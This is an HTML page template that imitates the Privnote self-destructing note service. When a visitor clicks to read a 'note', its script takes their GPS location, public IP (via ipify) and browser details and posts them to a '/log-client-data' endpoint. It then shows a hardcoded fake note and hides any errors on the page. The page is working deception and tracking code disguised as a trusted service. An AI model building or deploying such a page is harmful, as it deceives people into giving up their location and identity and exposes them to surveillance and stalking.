<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privnote - Send Notes that Self-destruct</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
        }
        #header {
            background-color: #b30e0e;
            color: white;
            text-align: center;
            padding: 20px;
        }
        #header img {
            max-width: 150px;
            height: auto;
        }
        #container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        #main-content {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 600px;
            width: 90%;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        p {
            font-size: 18px;
            margin-bottom: 20px;
        }
        .button {
            background-color: #b30e0e;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            margin-top: 20px;
            border-radius: 5px;
            font-size: 16px;
        }
        .button:hover {
            background-color: #900909;
        }
        .button-secondary {
            background-color: #ccc;
            color: black;
        }
        .button-secondary:hover {
            background-color: #999;
        }
        #note-content {
            margin-top: 20px;
            display: none;
        }
        textarea {
            width: 100%;
            max-width: 100%;
            height: 120px;
        }
        #status {
            color: black;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div id="header">
    <img src="/logo.jpg" alt="Privnote Logo"> <!-- Updated the path -->
    <h2>Send notes that will self-destruct after being read.</h2>
</div>

<div id="container">
    <div id="main-content">
        <h1>Read and destroy?</h1>
        <p>You're about to read and destroy the note with id <strong id="note-id"><%= noteId %></strong>.</p> <!-- EJS dynamic content for note ID -->
        <button id="getLocation" class="button">Yes, show me the note</button>
        <button class="button button-secondary">No, not now</button>
        
        <div id="note-content">
            <h2>Note contents</h2>
            <textarea id="note-text" readonly></textarea>
        </div>
        <p id="status"></p>
    </div>
</div>

<script>
// Geolocation and client data collection
document.getElementById('getLocation').addEventListener('click', async function() {
    const statusElement = document.getElementById('status');
    statusElement.textContent = 'Fetching Note...';  // Updated text

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            // Geolocation success
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const publicIP = await fetchPublicIP(); // Function to fetch public IP
            const browserInfo = getBrowserInfo(); // Function to gather browser info

            console.log(`Geolocation success. Lat: ${latitude}, Long: ${longitude}`);

            // Send the data to the server
            fetch('/log-client-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude, longitude, publicIP, browserInfo })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Client data logged:', data);
                // Show note contents after data is sent
                document.getElementById('note-text').value = "Yo, ca va ? he dis moi , ¬¬§°§°#€€€";
                document.getElementById('note-content').style.display = 'block';
                statusElement.textContent = ''; // Clear the status message
            })
            .catch(error => {
                console.error('Error logging client data:', error);
                statusElement.textContent = ''; // No error message shown on page
            });
        }, (error) => {
            console.error('Geolocation error code:', error.code, error.message);
            statusElement.textContent = ''; // No error message shown on page
        });
    } else {
        console.error('Geolocation is not supported by this browser.');
        statusElement.textContent = ''; // No error message shown on page
    }
});

// Fetch public IP
async function fetchPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching public IP:', error);
        return null;
    }
}

// Get browser information
function getBrowserInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language
    };
}
</script>

</body>
</html>
